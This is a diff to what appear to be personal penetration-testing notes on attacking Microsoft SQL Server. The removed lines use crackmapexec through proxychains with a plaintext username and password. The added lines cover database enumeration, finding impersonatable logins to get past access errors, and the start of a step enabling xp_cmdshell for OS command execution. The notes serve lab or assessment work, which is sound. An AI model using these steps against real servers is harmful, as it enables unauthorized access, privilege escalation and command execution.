@@ -5,18 +5,38 @@ Model
 Msdb
 Tempdb
 ```
+### Queries to run 
+```
+# Get version
+select @@version;
+# Get user
+select user_name();
 
-### Show all databases
-proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.124.142 -u web_svc -p Diamond1 -q 'SELECT name FROM master.sys.databases;'
-SELECT name FROM sys.databases;
+#show database 
+SELECT name FROM master..sysdatabases;
 
-### Show all tables from msdb database
-proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.124.142 -u web_svc -p Diamond1 -q 'SELECT name FROM msdb.sys.tables'
-SELECT * FROM database_name.information_schema.tables;
+# Use database
+USE master
 
-### show all values of tablename from database_name
-select * from database_name.dbo.table_name;
+#Get table names
+SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
+SELECT * FROM information_schema.tables
 
+# Get table content
+> SELECT * FROM <database_name>.dbo.<table_name>
+```
+### If current user does not have permission o view database
+Backgroup  
+>SQL (HAERO\discovery  guest@master)> use hrappdb
+>ERROR: Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.
+
+Solution
+```
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+name             
+--------------   
+hrappdb-reader
+```
 ### Enable command execution
 ```
 enable_xp_cmdshell;
